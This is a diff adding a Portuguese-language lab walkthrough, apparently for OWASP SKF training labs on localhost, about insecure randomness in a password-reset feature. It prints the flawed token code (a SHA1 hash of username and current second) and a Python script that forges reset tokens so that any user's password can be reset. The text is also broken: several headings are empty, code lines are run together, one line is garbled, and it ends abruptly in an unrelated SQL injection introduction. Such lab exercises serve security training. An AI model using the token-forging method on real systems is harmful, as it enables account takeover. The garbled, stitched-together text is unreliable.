@@ -1,0 +1,78 @@
+Introdução à aleatoriedade insegura em aplicações web
+
+O problema surge quando aplicações web utilizam geradores de números pseudoaleatórios (PRNGs) determinísticos, ou seja, que produzem uma sequência previsível de números com base em um valor inicial predefinido.
+Ataques podem explorar essa previsibilidade para comprometer a segurança de um sistema, já que podem potencialmente determinar o valor inicial ou a sequência de números aleatórios
+
+A aleatoriedade insegura pode levar a vários problemas de segurança, tais como:
+
+Sequestro de sessão:
+
+Ataques de força bruta:
+
+Previsão:
+
+
+Primeiro, certifique-se de que o Python 3 e o pip estejam instalados em sua máquina host.
+
+Após a instalação, acesse a pasta do laboratório que deseja praticar, por exemplo,`/skf-labs/XSS/` ou `/skf-labs/jwt-secret/`, e execute os seguintes comandos.
+
+Step1
+
+O primeiro passo é entender como funciona a funcionalidade de redefinição de senha. 
+Identificamos que existe um endpoint /forget que serve a página de redefinição de senha.
+
+{http://localhost:5000/forget}
+
+Step2
+
+Envie um nome de usuário para o formulário de redefinição de senha para gerar um token de redefinição. 
+
+http://localhost:5000/passwordForget
+Step3
+
+
+Observe que o token de redefinição é gerado usando o timestamp atual e o nome de usuário. 
+
+current_time = datetime.datetime.now()timestamp = current_time.secondto_hash = values[0][1] +str(timestamp)resetToken = hashlib.sha1(to_hash.encode('utf-8')).hexdigest()
+
+log do container:
+
+10.88.0.1 - - [01/Mar/2026 01:33:42] "GET /static/img/badge.svg HTTP/1.1" 304 -
+/reset/admin/a47cec3a96280528c4af0d8e6aecb52c11639230
+10.88.0.1 - - [01/Mar/2026 01:34:22] "POST /passwordForget HTTP/1.1" 200 -
+10.88.0.1 - - [01/Mar/2026 01:34:22] "GET /static/css/datepicker3.css HTTP/1.1" 304 -
+
+Step4
+
+Podemos explorar essa lógica gerando o token nós mesmos. Primeiro, obtemos ahora atual e o nome de usuário. Em seguida, usamos a mesma lógica para cria um token.
+
+import hashlibimport datetimeusername = 'testuser'current_time = datetime.datetime.now()timestamp = current_time.secondto_hash = username + str(timestamp)resetToken = hashlib.sha1(to_hash.encode('utf-8')).hexdigest()print(resetToken)
+
+
+Step5
+
+Utilize o token gerado para redefinir a senha acessando o seguinte URL
+
+http://localhost:5000/reset/<username>/<resetToken>
+
+Exploitation:
+
+Agora que entendemos a vulnerabilidade, podemos usá-la para redefinir a senha de qualquer usuário, gerando um token válido e acessando o link de redefinição.
+
+MAXIMA:"Não adianta usar hash forte se a entrada não é realmente aleatória."
+
+Introdução às funções hash obsoletas
+
+O uso de funções hash obsoletas em aplicações web pode levar a diversos problemas de segurança:
+
+Ataques de colisão
+
+Ataques de força bruta:
+
+Falhas na implementação:
+
+
+Licação aprendida: traducaçaõ do portugues altera a said hash
+
+
+A injeção de SQL (Structured Query Language) é uma vulnerabilidade comum em aplicações web que ocorre quando um código SQL malicioso é inserido em uma consulta ao banco de dados da aplicação.
